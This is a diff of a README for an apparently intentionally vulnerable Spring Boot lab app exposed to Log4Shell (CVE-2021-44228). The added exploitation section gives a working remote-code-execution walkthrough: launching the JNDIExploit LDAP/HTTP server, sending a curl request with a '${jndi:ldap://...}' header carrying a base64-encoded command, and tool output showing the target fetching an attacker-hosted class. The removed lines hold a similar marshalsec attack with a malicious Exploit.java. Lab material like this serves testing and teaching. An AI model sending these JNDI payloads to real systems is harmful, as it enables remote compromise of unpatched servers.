@@ -2,7 +2,7 @@
 
 This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).
 
-It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_191.
+It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_181.
 
 ![](./screenshot.png)
 
@@ -23,58 +23,48 @@ docker run -p 8080:8080 vulnerable-app
 
 ## Exploitation
 
-You can confirm the application is vulnerable by running:
+First, download JNDIExploit from [here](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2). Run the jar to launch the exploit LDAP server from an IP that the application can reach:
 
 ```bash
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}'
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <ldap-server-ip> -p <http-port>
+```
+Confirm the exploit by running:
+
+```bash
+curl <application-ip>:8080 -H 'X-Api-Version: ${jndi:ldap://<ldap-server-ip>:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9vd25lZC50eHQ=}'
+```
+The base64 value decodes to `touch /tmp/owned.txt`. 
+
+You will see similar output from JNDIExploit like below:
+
+```bash
+root@2111:~/# java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <ldap-server-ip> -p 8888
+[+] LDAP Server Start Listening on 1389...
+[+] HTTP Server Start Listening on 8888...
+[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9vd25lZC50eHQ=
+[+] Paylaod: command
+[+] Command: touch /tmp/owned.txt
+[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9vd25lZC50eHQ= with basic remote reference payload
+[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9vd25lZC50eHQ= redirecting to http://<ldap-server-ip>:8888/ExploitDRbp2Hes0L.class
+[+] New HTTP Request From /127.0.0.1:34010  /ExploitDRbp2Hes0L.class
+[+] Receive ClassRequest: ExploitDRbp2Hes0L.class
+[+] Response Code: 200
 ```
 
-You will see the following stack trace in the application logs:
+Now check the `/tmp` folder inside the docker container and the text file `owned.txt` should be there:
 
+```sh
+root@2111:~/# docker ps
+CONTAINER ID   IMAGE       COMMAND                  CREATED              STATUS              PORTS                                       NAMES
+efebc918d9cb   vulnerable-app   "java -jar /app/spri…"   About a minute ago   Up About a minute   0.0.0.0:8080->8080/tcp, :::8080->8080/tcp   vulnerable-app
+
+root@2111:~/# docker exec -it efebc918d9cb ash   
+/ # ls /tmp
+hsperfdata_root
+owned.txt
+tomcat-docbase.8080.2415120533529983821
+tomcat.8080.1416539772670722454
 ```
-2021-12-10 12:43:13,416 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://127.0.0.1/a]. javax.naming.CommunicationException: 127.0.0.1:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
-	at com.sun.jndi.ldap.Connection.<init>(Connection.java:238)
-	at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
-	at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1615)
-	at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2749)
-	at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:319)
-	at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)
-	at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)
-	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202)
-	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
-	at javax.naming.InitialContext.lookup(InitialContext.java:417)
-	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
-```
-
-## Note
-
-While this is enough to show the application is vulnerable, I do not have a full PoC yet. As explained in LunaSec's advisory, the exploitation steps should be:
-* Use [MarshelSec](https://github.com/mbechler/marshalsec) to run a malicious LDAP server:
-
-```
-java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your-local-ip:8888/#Exploit"
-```
-
-* Generate `Exploit.class` as follows:
-
-```
-cat >> Exploit.java <<EOF
-class Exploit {
-    static {
-        try { Runtime.getRuntime().exec("touch /pwned"); } catch(Exception e) {}
-    }
-}
-EOF
-javac Exploit.java
-```
-
-* Make the file available: `python3 -m http.server --bind 0.0.0.0 8888`
-
-* Trigger the exploit: `curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.1.143:1389}`
-
-Unfortunately, I am experiencing the same issue with marshalsec as other people (see [marshalsec#20](https://github.com/mbechler/marshalsec/issues/20)) where the first-stage of the exploit is triggered, but the second stage is not.
-
-That said, I believe the output above is enough to demonstrate the application is vulnerable, since (1) it connects to the LDAP server, and (2) it doesn't connect to the LDAP server when using a patched version of log4j.
 
 ## Reference
 
